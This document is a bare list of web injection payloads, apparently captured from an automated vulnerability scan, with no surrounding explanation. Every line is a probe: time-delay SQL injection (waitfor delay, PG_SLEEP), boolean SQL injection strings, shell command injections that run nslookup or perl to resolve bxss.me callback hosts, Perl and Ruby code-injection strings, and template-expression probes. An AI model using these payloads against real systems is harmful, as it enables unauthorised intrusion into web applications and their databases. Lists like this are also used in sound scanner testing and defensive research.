+-1" OR 2 23-23-1=0 0 0 1 --
+QacK9fY7
+-1 OR 2 784-784-1=0 0 0 1 --
+-1 OR 3 784-784-1=0 0 0 1 --
+cyKSqT5L
+-1 OR 3*2<(0 5 784-784) --
+-1 OR 2 125-125-1=0 0 0 1 --
+-1 OR 2 147-147-1=0 0 0 1
+-1 OR 3*2>(0 5 784-784) --
+-1' OR 2 519-519-1=0 0 0 1 --
+-1 OR 2 884-884-1=0 0 0 1
+-1' OR 2 675-675-1=0 0 0 1 or 'W6OTYY6R'='
+-1" OR 2 404-404-1=0 0 0 1 --
+-1' OR 2 116-116-1=0 0 0 1 --
+-1' OR 2 614-614-1=0 0 0 1 or '1eFL4mZB'='
+-1" OR 2 410-410-1=0 0 0 1 --
+" "A".concat(70-3).concat(22*4).concat(114).concat(69).concat(113).concat(83) (require"socket" Socket.gethostbyname("hitgg" "cfdwndlyf001e.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(102).concat(69).concat(121).concat(83) (require'socket' Socket.gethostbyname('hitmx' 'meqbgffke4cb6.bxss.me.')[3].to_s) '
+CrcxoTXv'; waitfor delay '0:0:15' --
+myydGmK0'; waitfor delay '0:0:15' --
+QtaOUbrK'); waitfor delay '0:0:15' --
+jbikTCBb'); waitfor delay '0:0:15' --
+CTn9Tsdh'; waitfor delay '0:0:15' --
+waffQSOw'; waitfor delay '0:0:15' --
+echo rcniys$()\ injeae\nz^xyu||a #' &echo rcniys$()\ injeae\nz^xyu||a #|" &echo rcniys$()\ injeae\nz^xyu||a #
+nQTYyMLL')); waitfor delay '0:0:15' --
+sdMgFKUY')); waitfor delay '0:0:15' --
+&echo pmhjte$()\ fitbja\nz^xyu||a #' &echo pmhjte$()\ fitbja\nz^xyu||a #|" &echo pmhjte$()\ fitbja\nz^xyu||a #
+|echo vjwwgf$()\ emccyq\nz^xyu||a #' |echo vjwwgf$()\ emccyq\nz^xyu||a #|" |echo vjwwgf$()\ emccyq\nz^xyu||a #
+(nslookup hitatzypvupctebf5a.bxss.me||perl -e "gethostbyname('hitatzypvupctebf5a.bxss.me')")
+c9fK0kws'); waitfor delay '0:0:15' --
+$(nslookup hitpdbkeubnrm42277.bxss.me||perl -e "gethostbyname('hitpdbkeubnrm42277.bxss.me')")
+&(nslookup hitbgfxswqiym4e995.bxss.me||perl -e "gethostbyname('hitbgfxswqiym4e995.bxss.me')")&'\"`0&(nslookup hitbgfxswqiym4e995.bxss.me||perl -e "gethostbyname('hitbgfxswqiym4e995.bxss.me')")&`'
+|(nslookup hitwmvmpvtrxj2b51f.bxss.me||perl -e "gethostbyname('hitwmvmpvtrxj2b51f.bxss.me')")
+76y3JCoF'); waitfor delay '0:0:15' --
+`(nslookup hitrskarftzga3bcbd.bxss.me||perl -e "gethostbyname('hitrskarftzga3bcbd.bxss.me')")`
+;(nslookup hitfhdzzffnpz61345.bxss.me||perl -e "gethostbyname('hitfhdzzffnpz61345.bxss.me')")|(nslookup hitfhdzzffnpz61345.bxss.me||perl -e "gethostbyname('hitfhdzzffnpz61345.bxss.me')")&(nslookup hitfhdzzffnpz61345.bxss.me||perl -e "gethostbyname('hitfhdzzffnpz61345.bxss.me')")
+3BRWub9M' OR 906=(SELECT 906 FROM PG_SLEEP(15))--
+796GP8WG' OR 898=(SELECT 898 FROM PG_SLEEP(15))--
+tFW0tEZ3')); waitfor delay '0:0:15' --
+bkVkf0ch')); waitfor delay '0:0:15' --
+qxZCpptv') OR 362=(SELECT 362 FROM PG_SLEEP(15))--
+1uo2dzfC') OR 55=(SELECT 55 FROM PG_SLEEP(15))--
+XpxaWlFa' OR 534=(SELECT 534 FROM PG_SLEEP(15))--
+iczvlGkV' OR 447=(SELECT 447 FROM PG_SLEEP(15))--
+OQXeNizN')) OR 318=(SELECT 318 FROM PG_SLEEP(15))--
+MNkLvzPA')) OR 557=(SELECT 557 FROM PG_SLEEP(15))--
+34eN4ZFd') OR 742=(SELECT 742 FROM PG_SLEEP(15))--
+R0g85Ahi') OR 711=(SELECT 711 FROM PG_SLEEP(15))--
+@@lBvZV
+@@eGkU8
+EjEQi5vu')) OR 874=(SELECT 874 FROM PG_SLEEP(15))--
+GiVtMcQv')) OR 627=(SELECT 627 FROM PG_SLEEP(15))--
+@@Zd3r8
+@@P49ZN
+${10000434 9999777}
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3469.1 Safari/537.36
+'.gethostbyname(lc('hitkk'.'smciztxm597ea.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(104).chr(79).chr(98).chr(78).'
+".gethostbyname(lc("hitxz"."asjasaex8fa08.bxss.me."))."A".chr(67).chr(hex("58")).chr(120).chr(68).chr(105).chr(72)."
+" "A".concat(70-3).concat(22*4).concat(99).concat(89).concat(100).concat(66) (require"socket" Socket.gethostbyname("hitkc" "dfuzkmzmfca83.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(102).concat(71).concat(120).concat(68) (require'socket' Socket.gethostbyname('hitas' 'gppavxkl34ecf.bxss.me.')[3].to_s) '
+echo fvfzyj$()\ watyzk\nz^xyu||a #' &echo fvfzyj$()\ watyzk\nz^xyu||a #|" &echo fvfzyj$()\ watyzk\nz^xyu||a #
+&echo cpuhty$()\ xhmngw\nz^xyu||a #' &echo cpuhty$()\ xhmngw\nz^xyu||a #|" &echo cpuhty$()\ xhmngw\nz^xyu||a #
+|echo gszbpm$()\ lsdtde\nz^xyu||a #' |echo gszbpm$()\ lsdtde\nz^xyu||a #|" |echo gszbpm$()\ lsdtde\nz^xyu||a #
+(nslookup hitvlkjakhzred00d0.bxss.me||perl -e "gethostbyname('hitvlkjakhzred00d0.bxss.me')")
+$(nslookup hitidfwbdhwgs1c5f2.bxss.me||perl -e "gethostbyname('hitidfwbdhwgs1c5f2.bxss.me')")
+&(nslookup hitsulfcnecxf3b889.bxss.me||perl -e "gethostbyname('hitsulfcnecxf3b889.bxss.me')")&'\"`0&(nslookup hitsulfcnecxf3b889.bxss.me||perl -e "gethostbyname('hitsulfcnecxf3b889.bxss.me')")&`'
+|(nslookup hitwpzrfhqkyy640c0.bxss.me||perl -e "gethostbyname('hitwpzrfhqkyy640c0.bxss.me')")
+`(nslookup hitmgpmmouarf05c2c.bxss.me||perl -e "gethostbyname('hitmgpmmouarf05c2c.bxss.me')")`
+${9999871 9999146}
+;(nslookup hitzssliapojc76e22.bxss.me||perl -e "gethostbyname('hitzssliapojc76e22.bxss.me')")|(nslookup hitzssliapojc76e22.bxss.me||perl -e "gethostbyname('hitzssliapojc76e22.bxss.me')")&(nslookup hitzssliapojc76e22.bxss.me||perl -e "gethostbyname('hitzssliapojc76e22.bxss.me')")
+'.gethostbyname(lc('hitoy'.'vlrfupkdaa15f.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(118).chr(76).chr(112).chr(73).'
+".gethostbyname(lc("hitkc"."nafkozel39f49.bxss.me."))."A".chr(67).chr(hex("58")).chr(121).chr(86).chr(111).chr(89)."
+" "A".concat(70-3).concat(22*4).concat(110).concat(81).concat(106).concat(67) (require"socket" Socket.gethostbyname("hitap" "ifcgqslf69469.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(120).concat(71).concat(109).concat(90) (require'socket' Socket.gethostbyname('hityu' 'yslinydfcf9b9.bxss.me.')[3].to_s) '
+echo sbdgkb$()\ gwmkzi\nz^xyu||a #' &echo sbdgkb$()\ gwmkzi\nz^xyu||a #|" &echo sbdgkb$()\ gwmkzi\nz^xyu||a #
+&echo wiukzh$()\ ktnkco\nz^xyu||a #' &echo wiukzh$()\ ktnkco\nz^xyu||a #|" &echo wiukzh$()\ ktnkco\nz^xyu||a #
+${9999892 10000265}
+|echo ttgttg$()\ gmvlak\nz^xyu||a #' |echo ttgttg$()\ gmvlak\nz^xyu||a #|" |echo ttgttg$()\ gmvlak\nz^xyu||a #
+(nslookup hitofztrmkqjz0d510.bxss.me||perl -e "gethostbyname('hitofztrmkqjz0d510.bxss.me')")
+$(nslookup hitmideianomrff986.bxss.me||perl -e "gethostbyname('hitmideianomrff986.bxss.me')")
+&(nslookup hitukcevmjskw77df5.bxss.me||perl -e "gethostbyname('hitukcevmjskw77df5.bxss.me')")&'\"`0&(nslookup hitukcevmjskw77df5.bxss.me||perl -e "gethostbyname('hitukcevmjskw77df5.bxss.me')")&`'
+|(nslookup hitkynkvppzxr336af.bxss.me||perl -e "gethostbyname('hitkynkvppzxr336af.bxss.me')")
+`(nslookup hithryqngtpsdfa83c.bxss.me||perl -e "gethostbyname('hithryqngtpsdfa83c.bxss.me')")`
+'.gethostbyname(lc('hitng'.'dygcyqjqd5711.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(103).chr(85).chr(104).chr(76).'
+".gethostbyname(lc("hittv"."jxdmmlvldbfe6.bxss.me."))."A".chr(67).chr(hex("58")).chr(99).chr(66).chr(102).chr(87)."
+;(nslookup hitlvyaflpgyk86f67.bxss.me||perl -e "gethostbyname('hitlvyaflpgyk86f67.bxss.me')")|(nslookup hitlvyaflpgyk86f67.bxss.me||perl -e "gethostbyname('hitlvyaflpgyk86f67.bxss.me')")&(nslookup hitlvyaflpgyk86f67.bxss.me||perl -e "gethostbyname('hitlvyaflpgyk86f67.bxss.me')")
+" "A".concat(70-3).concat(22*4).concat(120).concat(68).concat(107).concat(70) (require"socket" Socket.gethostbyname("hitlp" "xsgkbhhu0ef26.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(119).concat(78).concat(120).concat(78) (require'socket' Socket.gethostbyname('hitpj' 'hqwiriqk956c5.bxss.me.')[3].to_s) '
+1B6R73Nad6O
+1CdN0FnvLO
+1xrHZCa2YO
+echo woymqt$()\ hztzhp\nz^xyu||a #' &echo woymqt$()\ hztzhp\nz^xyu||a #|" &echo woymqt$()\ hztzhp\nz^xyu||a #
+&echo pywepb$()\ yzdowt\nz^xyu||a #' &echo pywepb$()\ yzdowt\nz^xyu||a #|" &echo pywepb$()\ yzdowt\nz^xyu||a #
+|echo dqkppy$()\ pyecdc\nz^xyu||a #' |echo dqkppy$()\ pyecdc\nz^xyu||a #|" |echo dqkppy$()\ pyecdc\nz^xyu||a #
+(nslookup hityrkvyjemxycb876.bxss.me||perl -e "gethostbyname('hityrkvyjemxycb876.bxss.me')")
+$(nslookup hitmuboyfgztza44e9.bxss.me||perl -e "gethostbyname('hitmuboyfgztza44e9.bxss.me')")
+&(nslookup hitaqrgeoqukae8cbf.bxss.me||perl -e "gethostbyname('hitaqrgeoqukae8cbf.bxss.me')")&'\"`0&(nslookup hitaqrgeoqukae8cbf.bxss.me||perl -e "gethostbyname('hitaqrgeoqukae8cbf.bxss.me')")&`'
+|(nslookup hitmwpadzrcsn71718.bxss.me||perl -e "gethostbyname('hitmwpadzrcsn71718.bxss.me')")
+${9999489 9999129}
+`(nslookup hitprftbkqlshff690.bxss.me||perl -e "gethostbyname('hitprftbkqlshff690.bxss.me')")`
+;(nslookup hitjlrfnvatpac90a4.bxss.me||perl -e "gethostbyname('hitjlrfnvatpac90a4.bxss.me')")|(nslookup hitjlrfnvatpac90a4.bxss.me||perl -e "gethostbyname('hitjlrfnvatpac90a4.bxss.me')")&(nslookup hitjlrfnvatpac90a4.bxss.me||perl -e "gethostbyname('hitjlrfnvatpac90a4.bxss.me')")
+'.gethostbyname(lc('hitlb'.'wqvlbewa6173d.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(119).chr(69).chr(114).chr(78).'
+".gethostbyname(lc("hitby"."akpxhrqv4a4fe.bxss.me."))."A".chr(67).chr(hex("58")).chr(114).chr(86).chr(97).chr(88)."
+" "A".concat(70-3).concat(22*4).concat(111).concat(75).concat(102).concat(67) (require"socket" Socket.gethostbyname("hitea" "xusfbawb7eccb.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(104).concat(86).concat(120).concat(87) (require'socket' Socket.gethostbyname('hiteq' 'yrzjwanjbf604.bxss.me.')[3].to_s) '
+echo zuovbn$()\ nfxtpd\nz^xyu||a #' &echo zuovbn$()\ nfxtpd\nz^xyu||a #|" &echo zuovbn$()\ nfxtpd\nz^xyu||a #
+&echo jixhas$()\ dwbtyn\nz^xyu||a #' &echo jixhas$()\ dwbtyn\nz^xyu||a #|" &echo jixhas$()\ dwbtyn\nz^xyu||a #
+|echo ksxduh$()\ qstoul\nz^xyu||a #' |echo ksxduh$()\ qstoul\nz^xyu||a #|" |echo ksxduh$()\ qstoul\nz^xyu||a #
+(nslookup hitlzecjmxoimff52e.bxss.me||perl -e "gethostbyname('hitlzecjmxoimff52e.bxss.me')")
+$(nslookup hitjvbqxfdwfmcca7b.bxss.me||perl -e "gethostbyname('hitjvbqxfdwfmcca7b.bxss.me')")
+${9999379 9999405}
+&(nslookup hitwaibkcihrh03b0a.bxss.me||perl -e "gethostbyname('hitwaibkcihrh03b0a.bxss.me')")&'\"`0&(nslookup hitwaibkcihrh03b0a.bxss.me||perl -e "gethostbyname('hitwaibkcihrh03b0a.bxss.me')")&`'
+|(nslookup hitjmyrocmekhe569f.bxss.me||perl -e "gethostbyname('hitjmyrocmekhe569f.bxss.me')")
+`(nslookup hittrfwkjphti55f10.bxss.me||perl -e "gethostbyname('hittrfwkjphti55f10.bxss.me')")`
+;(nslookup hitfymassvfpbce632.bxss.me||perl -e "gethostbyname('hitfymassvfpbce632.bxss.me')")|(nslookup hitfymassvfpbce632.bxss.me||perl -e "gethostbyname('hitfymassvfpbce632.bxss.me')")&(nslookup hitfymassvfpbce632.bxss.me||perl -e "gethostbyname('hitfymassvfpbce632.bxss.me')")
+'.gethostbyname(lc('hitzu'.'mqqunwrk8044a.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(120).chr(82).chr(104).chr(78).'
+".gethostbyname(lc("hitfz"."vpcnkkvp1d32b.bxss.me."))."A".chr(67).chr(hex("58")).chr(110).chr(73).chr(103).chr(82)."
+" "A".concat(70-3).concat(22*4).concat(118).concat(89).concat(108).concat(82) (require"socket" Socket.gethostbyname("hital" "vbmmeaww4ed65.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(116).concat(83).concat(114).concat(90) (require'socket' Socket.gethostbyname('hitaa' 'qhbzovsl1caa7.bxss.me.')[3].to_s) '
+echo vxyfdj$()\ rqvwdg\nz^xyu||a #' &echo vxyfdj$()\ rqvwdg\nz^xyu||a #|" &echo vxyfdj$()\ rqvwdg\nz^xyu||a #
+&echo yaqvay$()\ rfoqre\nz^xyu||a #' &echo yaqvay$()\ rfoqre\nz^xyu||a #|" &echo yaqvay$()\ rfoqre\nz^xyu||a #
+${9999686 9999040}
+|echo apioln$()\ bgrjcw\nz^xyu||a #' |echo apioln$()\ bgrjcw\nz^xyu||a #|" |echo apioln$()\ bgrjcw\nz^xyu||a #
+2KfVoizq
+(nslookup hitzoyvsevoog7fddd.bxss.me||perl -e "gethostbyname('hitzoyvsevoog7fddd.bxss.me')")
+-1 OR 2 61-61-1=0 0 0 1 --
+$(nslookup hitowygfswohwee26e.bxss.me||perl -e "gethostbyname('hitowygfswohwee26e.bxss.me')")
+-1 OR 2 264-264-1=0 0 0 1
+&(nslookup hitceompflompa2896.bxss.me||perl -e "gethostbyname('hitceompflompa2896.bxss.me')")&'\"`0&(nslookup hitceompflompa2896.bxss.me||perl -e "gethostbyname('hitceompflompa2896.bxss.me')")&`'
+zz3kS4cy
+-1' OR 2 274-274-1=0 0 0 1 --
+|(nslookup hitpzjqshwfuvdc4f7.bxss.me||perl -e "gethostbyname('hitpzjqshwfuvdc4f7.bxss.me')")
+-1 OR 2 695-695-1=0 0 0 1 --
+-1' OR 2 415-415-1=0 0 0 1 or 'n2OqmI6M'='
+`(nslookup hitxigggqifjh7ee2c.bxss.me||perl -e "gethostbyname('hitxigggqifjh7ee2c.bxss.me')")`
+-1 OR 2 242-242-1=0 0 0 1
+-1" OR 2 336-336-1=0 0 0 1 --
+;(nslookup hitzhiythmnjh9f7ad.bxss.me||perl -e "gethostbyname('hitzhiythmnjh9f7ad.bxss.me')")|(nslookup hitzhiythmnjh9f7ad.bxss.me||perl -e "gethostbyname('hitzhiythmnjh9f7ad.bxss.me')")&(nslookup hitzhiythmnjh9f7ad.bxss.me||perl -e "gethostbyname('hitzhiythmnjh9f7ad.bxss.me')")
+'.gethostbyname(lc('hitfy'.'mnxahfgec0627.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(98).chr(80).chr(109).chr(86).'
+-1' OR 2 966-966-1=0 0 0 1 --
+".gethostbyname(lc("hitsz"."bxdvavhpa7533.bxss.me."))."A".chr(67).chr(hex("58")).chr(120).chr(77).chr(105).chr(90)."
+-1' OR 2 69-69-1=0 0 0 1 or '88zzMb1G'='
+-1" OR 2 397-397-1=0 0 0 1 --
+" "A".concat(70-3).concat(22*4).concat(111).concat(71).concat(116).concat(76) (require"socket" Socket.gethostbyname("hituh" "tqxoecbjbb604.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(119).concat(89).concat(98).concat(85) (require'socket' Socket.gethostbyname('hitew' 'tfymtfzp18d1e.bxss.me.')[3].to_s) '
+1DN5idsmoCO
+ACFAl0wD'; waitfor delay '0:0:15' --
+1CM4dBSSdLO
+1BRyfLyQCYO
+wBGE9yP9'; waitfor delay '0:0:15' --
+JqYlDiJd'); waitfor delay '0:0:15' --
+echo mafadc$()\ nbkgso\nz^xyu||a #' &echo mafadc$()\ nbkgso\nz^xyu||a #|" &echo mafadc$()\ nbkgso\nz^xyu||a #
+&echo pbxbkm$()\ ygmrww\nz^xyu||a #' &echo pbxbkm$()\ ygmrww\nz^xyu||a #|" &echo pbxbkm$()\ ygmrww\nz^xyu||a #
+|echo cgxsna$()\ hqywfw\nz^xyu||a #' |echo cgxsna$()\ hqywfw\nz^xyu||a #|" |echo cgxsna$()\ hqywfw\nz^xyu||a #
+(nslookup hitfvgxnudeqv423a8.bxss.me||perl -e "gethostbyname('hitfvgxnudeqv423a8.bxss.me')")
+$(nslookup hitqoegaumkxg32e1e.bxss.me||perl -e "gethostbyname('hitqoegaumkxg32e1e.bxss.me')")
+&(nslookup hitobsdqzcloifc38c.bxss.me||perl -e "gethostbyname('hitobsdqzcloifc38c.bxss.me')")&'\"`0&(nslookup hitobsdqzcloifc38c.bxss.me||perl -e "gethostbyname('hitobsdqzcloifc38c.bxss.me')")&`'
+|(nslookup hitrtlcesodehae1c2.bxss.me||perl -e "gethostbyname('hitrtlcesodehae1c2.bxss.me')")
+`(nslookup hitsbsrlybafe2405d.bxss.me||perl -e "gethostbyname('hitsbsrlybafe2405d.bxss.me')")`
+;(nslookup hitnknwnfamrx2814f.bxss.me||perl -e "gethostbyname('hitnknwnfamrx2814f.bxss.me')")|(nslookup hitnknwnfamrx2814f.bxss.me||perl -e "gethostbyname('hitnknwnfamrx2814f.bxss.me')")&(nslookup hitnknwnfamrx2814f.bxss.me||perl -e "gethostbyname('hitnknwnfamrx2814f.bxss.me')")
+eo9Fzo3g'); waitfor delay '0:0:15' --
+JZdUZCeg')); waitfor delay '0:0:15' --
+${9999782 9999986}
+lVLXrAzR')); waitfor delay '0:0:15' --
+jyFvQv6x' OR 616=(SELECT 616 FROM PG_SLEEP(15))--
+'.gethostbyname(lc('hitgl'.'nunelgjgc292d.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(116).chr(84).chr(106).chr(69).'
+".gethostbyname(lc("hitbo"."rhrnzmnl81050.bxss.me."))."A".chr(67).chr(hex("58")).chr(100).chr(65).chr(121).chr(89)."
+XeNr2WGf' OR 990=(SELECT 990 FROM PG_SLEEP(15))--
+" "A".concat(70-3).concat(22*4).concat(100).concat(87).concat(106).concat(67) (require"socket" Socket.gethostbyname("hitte" "ioswvqfff3593.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(104).concat(84).concat(112).concat(74) (require'socket' Socket.gethostbyname('hitcf' 'ozwaiwzd71646.bxss.me.')[3].to_s) '
+0zCKibMD') OR 157=(SELECT 157 FROM PG_SLEEP(15))--
+W9uzuWvM') OR 86=(SELECT 86 FROM PG_SLEEP(15))--
+FFi4Knb5')) OR 170=(SELECT 170 FROM PG_SLEEP(15))--
+Fd2ob3YY')) OR 698=(SELECT 698 FROM PG_SLEEP(15))--
+@@O66ld
+@@oFgNB
+echo wxmrtq$()\ pieazj\nz^xyu||a #' &echo wxmrtq$()\ pieazj\nz^xyu||a #|" &echo wxmrtq$()\ pieazj\nz^xyu||a #
+&echo ugwaxl$()\ sakckk\nz^xyu||a #' &echo ugwaxl$()\ sakckk\nz^xyu||a #|" &echo ugwaxl$()\ sakckk\nz^xyu||a #
+|echo lmystv$()\ skpebp\nz^xyu||a #' |echo lmystv$()\ skpebp\nz^xyu||a #|" |echo lmystv$()\ skpebp\nz^xyu||a #
+(nslookup hitkmnzlrpans9b961.bxss.me||perl -e "gethostbyname('hitkmnzlrpans9b961.bxss.me')")
+$(nslookup hitgqbbhnhhww4612b.bxss.me||perl -e "gethostbyname('hitgqbbhnhhww4612b.bxss.me')")
+&(nslookup hitasvuxtfeli255cd.bxss.me||perl -e "gethostbyname('hitasvuxtfeli255cd.bxss.me')")&'\"`0&(nslookup hitasvuxtfeli255cd.bxss.me||perl -e "gethostbyname('hitasvuxtfeli255cd.bxss.me')")&`'
+|(nslookup hitdqwhbdtixb78410.bxss.me||perl -e "gethostbyname('hitdqwhbdtixb78410.bxss.me')")
+${10000356 10000477}
+`(nslookup hitozgbpqkvfd65e77.bxss.me||perl -e "gethostbyname('hitozgbpqkvfd65e77.bxss.me')")`
+;(nslookup hitztyvkdlwgqd401e.bxss.me||perl -e "gethostbyname('hitztyvkdlwgqd401e.bxss.me')")|(nslookup hitztyvkdlwgqd401e.bxss.me||perl -e "gethostbyname('hitztyvkdlwgqd401e.bxss.me')")&(nslookup hitztyvkdlwgqd401e.bxss.me||perl -e "gethostbyname('hitztyvkdlwgqd401e.bxss.me')")
+'.gethostbyname(lc('hitne'.'hfidiwce8c0ff.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(98).chr(72).chr(117).chr(67).'
+".gethostbyname(lc("hitvc"."wlnjyqwu4085b.bxss.me."))."A".chr(67).chr(hex("58")).chr(103).chr(70).chr(109).chr(75)."
+" "A".concat(70-3).concat(22*4).concat(112).concat(70).concat(119).concat(90) (require"socket" Socket.gethostbyname("hitpi" "bzrenizt4a82f.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(110).concat(68).concat(103).concat(75) (require'socket' Socket.gethostbyname('hitsn' 'svdxwrprbf5df.bxss.me.')[3].to_s) '
+1CffCCiLLNO
+echo qgynzo$()\ ehshyc\nz^xyu||a #' &echo qgynzo$()\ ehshyc\nz^xyu||a #|" &echo qgynzo$()\ ehshyc\nz^xyu||a #
+1KCnyaN8
+-1 OR 2 791-791-1=0 0 0 1 --
+&echo sywoxc$()\ jfquzt\nz^xyu||a #' &echo sywoxc$()\ jfquzt\nz^xyu||a #|" &echo sywoxc$()\ jfquzt\nz^xyu||a #
+-1 OR 2 365-365-1=0 0 0 1
+-1' OR 2 898-898-1=0 0 0 1 --
+|echo ekomgg$()\ rcupqd\nz^xyu||a #' |echo ekomgg$()\ rcupqd\nz^xyu||a #|" |echo ekomgg$()\ rcupqd\nz^xyu||a #
+-1' OR 2 553-553-1=0 0 0 1 or '3gmuwBkD'='
+-1" OR 2 225-225-1=0 0 0 1 --
+(nslookup hithappshahowdad0a.bxss.me||perl -e "gethostbyname('hithappshahowdad0a.bxss.me')")
+$(nslookup hitzhacucasum51efa.bxss.me||perl -e "gethostbyname('hitzhacucasum51efa.bxss.me')")
+&(nslookup hitaldeimplou99c67.bxss.me||perl -e "gethostbyname('hitaldeimplou99c67.bxss.me')")&'\"`0&(nslookup hitaldeimplou99c67.bxss.me||perl -e "gethostbyname('hitaldeimplou99c67.bxss.me')")&`'
+|(nslookup hitgdkjjqfrgg5d845.bxss.me||perl -e "gethostbyname('hitgdkjjqfrgg5d845.bxss.me')")
+`(nslookup hitdsyitgufcy3f908.bxss.me||perl -e "gethostbyname('hitdsyitgufcy3f908.bxss.me')")`
+${10000462 9999678}
+;(nslookup hitsacqdqsqux63a09.bxss.me||perl -e "gethostbyname('hitsacqdqsqux63a09.bxss.me')")|(nslookup hitsacqdqsqux63a09.bxss.me||perl -e "gethostbyname('hitsacqdqsqux63a09.bxss.me')")&(nslookup hitsacqdqsqux63a09.bxss.me||perl -e "gethostbyname('hitsacqdqsqux63a09.bxss.me')")
+yYuPADqL
+-1 OR 2 147-147-1=0 0 0 1 --
+-1 OR 2 666-666-1=0 0 0 1
+-1 OR 3 666-666-1=0 0 0 1
+zAvLMY6W
+-1 OR 3*2<(0 5 666-666)
+-1 OR 2 672-672-1=0 0 0 1 --
+-1 OR 2 601-601-1=0 0 0 1
+-1 OR 3*2>(0 5 666-666)
+-1' OR 2 467-467-1=0 0 0 1 --
+-1' OR 2 375-375-1=0 0 0 1 --
+-1' OR 2 547-547-1=0 0 0 1 or 'e98vIls1'='
+-1" OR 2 780-780-1=0 0 0 1 --
+-1' OR 2 14-14-1=0 0 0 1 or 'kjgdqQHe'='
+-1" OR 2 480-480-1=0 0 0 1 --
+weu6hN4C
+-1 OR 2 767-767-1=0 0 0 1 --
+-1 OR 3 767-767-1=0 0 0 1 --
+-1 OR 3*2<(0 5 767-767) --
+-1 OR 3*2>(0 5 767-767) --
+-1 OR 2 659-659-1=0 0 0 1
+-1' OR 2 361-361-1=0 0 0 1 --
+'.gethostbyname(lc('hitlz'.'zsrydvdd54e71.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(101).chr(68).chr(116).chr(87).'
+-1' OR 2 824-824-1=0 0 0 1 or 'IA4hF29c'='
+".gethostbyname(lc("hitel"."oicgxjaw7287e.bxss.me."))."A".chr(67).chr(hex("58")).chr(107).chr(73).chr(105).chr(78)."
+-1" OR 2 267-267-1=0 0 0 1 --
+xojmwdrb'; waitfor delay '0:0:15' --
+" "A".concat(70-3).concat(22*4).concat(105).concat(80).concat(111).concat(68) (require"socket" Socket.gethostbyname("hitnn" "arvrhcsg40b99.bxss.me.")[3].to_s) "
+2Gg6Y7ao'); waitfor delay '0:0:15' --
+' 'A'.concat(70-3).concat(22*4).concat(121).concat(85).concat(112).concat(89) (require'socket' Socket.gethostbyname('hitht' 'qlqebuwl0fb5a.bxss.me.')[3].to_s) '
+P0cX77w5
+-1 OR 2 441-441-1=0 0 0 1 --
+-1 OR 2 410-410-1=0 0 0 1
+e0nSLpAJ')); waitfor delay '0:0:15' --
+-1' OR 2 975-975-1=0 0 0 1 --
+-1' OR 2 787-787-1=0 0 0 1 or 'rsHjB5ff'='
+-1" OR 2 943-943-1=0 0 0 1 --
+2aPX8WG9' OR 471=(SELECT 471 FROM PG_SLEEP(15))--
+CqQeTQ2n'; waitfor delay '0:0:15' --
+N44atIZs'; waitfor delay '0:0:15' --
+ESzYytQS') OR 785=(SELECT 785 FROM PG_SLEEP(15))--
+e6I6kTwv'); waitfor delay '0:0:15' --
+E5eS0Y4e'); waitfor delay '0:0:15' --
+wDTj6tnB')) OR 500=(SELECT 500 FROM PG_SLEEP(15))--
+cacsuQAD')); waitfor delay '0:0:15' --
+aDnNzIri'; waitfor delay '0:0:15' --
+I6kPOUDh')); waitfor delay '0:0:15' --
+echo hifpiw$()\ fycexj\nz^xyu||a #' &echo hifpiw$()\ fycexj\nz^xyu||a #|" &echo hifpiw$()\ fycexj\nz^xyu||a #
+@@StiDn
+&echo qcjxix$()\ bugjlk\nz^xyu||a #' &echo qcjxix$()\ bugjlk\nz^xyu||a #|" &echo qcjxix$()\ bugjlk\nz^xyu||a #
+ORAmc4KJ' OR 933=(SELECT 933 FROM PG_SLEEP(15))--
+|echo ciilri$()\ mogegk\nz^xyu||a #' |echo ciilri$()\ mogegk\nz^xyu||a #|" |echo ciilri$()\ mogegk\nz^xyu||a #
+av0K7l8O'); waitfor delay '0:0:15' --
+(nslookup hithhnhropnvqa14f4.bxss.me||perl -e "gethostbyname('hithhnhropnvqa14f4.bxss.me')")
+$(nslookup hitjpeyvdhkqn3482d.bxss.me||perl -e "gethostbyname('hitjpeyvdhkqn3482d.bxss.me')")
+rNO1xS88' OR 927=(SELECT 927 FROM PG_SLEEP(15))--
+&(nslookup hitganxnnclkqc752c.bxss.me||perl -e "gethostbyname('hitganxnnclkqc752c.bxss.me')")&'\"`0&(nslookup hitganxnnclkqc752c.bxss.me||perl -e "gethostbyname('hitganxnnclkqc752c.bxss.me')")&`'
+|(nslookup hituwbxlasxza67590.bxss.me||perl -e "gethostbyname('hituwbxlasxza67590.bxss.me')")
+ibu9du4f') OR 545=(SELECT 545 FROM PG_SLEEP(15))--
+`(nslookup hitozfxsywmiw03e36.bxss.me||perl -e "gethostbyname('hitozfxsywmiw03e36.bxss.me')")`
+${9999157 9999536}
+2EeNK1Tb')); waitfor delay '0:0:15' --
+;(nslookup hithnqpgkzccb7778b.bxss.me||perl -e "gethostbyname('hithnqpgkzccb7778b.bxss.me')")|(nslookup hithnqpgkzccb7778b.bxss.me||perl -e "gethostbyname('hithnqpgkzccb7778b.bxss.me')")&(nslookup hithnqpgkzccb7778b.bxss.me||perl -e "gethostbyname('hithnqpgkzccb7778b.bxss.me')")
+YAkkDBDD') OR 710=(SELECT 710 FROM PG_SLEEP(15))--
+F1hWAdNk')) OR 444=(SELECT 444 FROM PG_SLEEP(15))--
+FTmhoifB'; waitfor delay '0:0:15' --
+DUqED7zd' OR 667=(SELECT 667 FROM PG_SLEEP(15))--
+S4EOoHsv')) OR 755=(SELECT 755 FROM PG_SLEEP(15))--
